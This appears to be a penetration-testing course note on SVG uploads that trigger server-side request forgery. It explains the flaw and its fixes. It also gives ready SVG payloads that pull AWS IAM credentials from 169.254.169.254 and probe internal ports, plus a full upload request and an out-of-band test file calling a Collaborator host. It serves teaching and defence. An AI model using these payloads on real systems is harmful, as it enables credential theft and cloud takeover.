---
tags: [vapt, file-upload, ssrf, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.08 File Upload + SSRF (SVG with SSRF payload)"
---

# 22.08 — File Upload + SSRF (SVG with SSRF payload)

## What is it?
Scalable Vector Graphics (SVG) are XML-based images. The SVG specification allows images to include external references, such as embedding other images via the `<image href="...">` tag, importing external stylesheets, or defining XML External Entities (XXE). 

If a web application accepts SVG files and performs server-side processing or rendering on them (for example, using tools like ImageMagick or `librsvg` to convert the SVG to a PNG thumbnail), the server-side XML parser will attempt to resolve these external references. This causes the server to make unauthorized HTTP requests, resulting in Server-Side Request Forgery (SSRF). An attacker can abuse this to scan internal network ports, access internal APIs, or extract highly sensitive cloud instance metadata (e.g., AWS IAM keys).

Think of it as giving a personal assistant an envelope containing instructions that say, "Before you file this document, go ask the vault manager for the master key, and write it down here." If the assistant blindly follows those embedded instructions, they will compromise the organization from the inside.

## ASCII Diagram
```text
[Attacker] 
   │ 
   │ 1. Uploads payload.svg with <image href="http://169.254.169.254/...">
   ▼
[Web Application]
   │
   │ 2. Passes SVG to rendering engine (e.g., to create a PNG thumbnail)
   ▼
[Rendering Engine (ImageMagick / librsvg)]
   │
   │ 3. Parses XML and encounters href
   │ 4. Makes HTTP GET request to the internal Cloud Metadata URL
   ▼
[Cloud Instance Metadata Service (169.254.169.254)]
   │
   │ 5. Returns AWS IAM Security Credentials
   ▼
[Rendering Engine]
   │
   │ 6. Embeds the credentials into the output PNG image
   ▼
[Web Application] ─── 7. Returns generated PNG to attacker ──> [Attacker]
```

## How to Find It
- **Manual steps:**
  1. Identify a file upload endpoint that accepts `.svg` files and processes them server-side (e.g., creating a preview, validating dimensions, or converting to `.png`).
  2. Create an SVG file that contains an `<image>` tag pointing to an Out-of-Band (OOB) listener (like Burp Collaborator).
  3. Upload the file and monitor your OOB listener.
  4. If your listener receives an HTTP request, the application is vulnerable to SSRF.

- **Tool commands with flags explained:**
  To generate a quick OOB test payload:
  ```bash
  cat << 'EOF' > ssrf_test.svg
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <image href="http://YOUR_COLLABORATOR_ID.oastify.com/" height="100" width="100"/>
  </svg>
  EOF
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Once OOB SSRF is confirmed, determine the hosting environment (AWS, GCP, Azure, or on-premise) to target the most valuable internal resources.
  2. Create a malicious SVG that points to the Cloud Metadata IP (`169.254.169.254`) or an internal service port (`localhost:6379` for Redis).
  3. Upload the SVG to the application.
  4. View the rendered output (e.g., the generated PNG thumbnail). Some rendering engines will literally draw the text response of the HTTP request into the image. If it doesn't render visually, you may need to rely on Blind SSRF techniques (like timing attacks for port scanning).

- **Actual payloads:**
  **AWS IAM Credential Extraction:**
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
    <!-- Older renderers might require xlink:href instead of just href -->
    <image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" height="100" width="100"/>
  </svg>
  ```
  
  **Blind Internal Port Scanning (Timing Attack):**
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <image href="http://127.0.0.1:22/" height="1" width="1"/>
  </svg>
  ```
  *If the port is open, the upload/rendering might finish instantly. If closed or filtered, it might hang or timeout.*

- **Real HTTP request/response examples:**
  **Upload Request:**
  ```http
  POST /api/generate-thumbnail HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="image"; filename="aws_ssrf.svg"
  Content-Type: image/svg+xml

  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role" width="500" height="500"/>
  </svg>
  ------WebKitFormBoundary--
  ```
  **Result:** The application returns a `.png` file. Upon opening the PNG, the attacker visually sees the JSON response containing the AWS `AccessKeyId`, `SecretAccessKey`, and `Token` rendered as text within the image bounds.

## Real-World Example
During a penetration test on a photo-sharing application, the tester noticed the site accepted SVGs and used a backend library to generate `.jpg` thumbnails for the gallery. The tester uploaded an SVG with an `<image>` tag pointing to `http://169.254.169.254/latest/user-data`. When the server processed the image, it fetched the EC2 instance's deployment script (which happened to contain hardcoded database passwords) and rasterized the text directly into the thumbnail. The tester simply viewed the thumbnail in the gallery to read the sensitive passwords.

## How to Fix It
- **Developer remediation:**
  To mitigate SSRF via SVGs, you must configure your server-side rendering engine or XML parser to explicitly block all network requests. If your application does not need to render SVGs server-side, simply serve them as static files (with XSS protections applied). If rendering is required, run the rendering process inside a heavily restricted sandbox (like a Docker container or network namespace) with no outbound internet access and no access to the loopback interface (`127.0.0.1`) or the local metadata IP (`169.254.169.254`).

- **Code snippet:**
  **ImageMagick Policy Configuration (`/etc/ImageMagick-6/policy.xml`):**
  ```xml
  <!-- Completely disable rendering of external URLs -->
  <policy domain="url" rights="none" pattern="*"/>
  <!-- Disable external references -->
  <policy domain="external" rights="none" pattern="*"/>
  ```
  
  **librsvg (Command Line Configuration):**
  ```bash
  # Run rsvg-convert with the flag that disables fetching external files
  rsvg-convert --no-external-files input.svg -o output.png
  ```

## Chaining Opportunities
- This vuln + [[Cloud Infrastructure (AWS, GCP, Azure)]] → Once SSRF is confirmed via SVG, directly target cloud metadata endpoints (`169.254.169.254` or `metadata.google.internal`) to steal IAM credentials and achieve full cloud environment takeover.
- This vuln + [[10 - File Upload + XXE (malicious DOCX/XLSX)]] → If the `<image>` tag doesn't work, attempt XXE payloads (`<!ENTITY xxe SYSTEM "http://...">`) inside the SVG, as both attacks target the underlying XML parsing library.

## Related Notes
- [[13 - SSRF — What is SSRF]]
- [[09 - File Upload + XSS (SVG with XSS payload)]]
- [[10 - File Upload + XXE (malicious DOCX/XLSX)]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
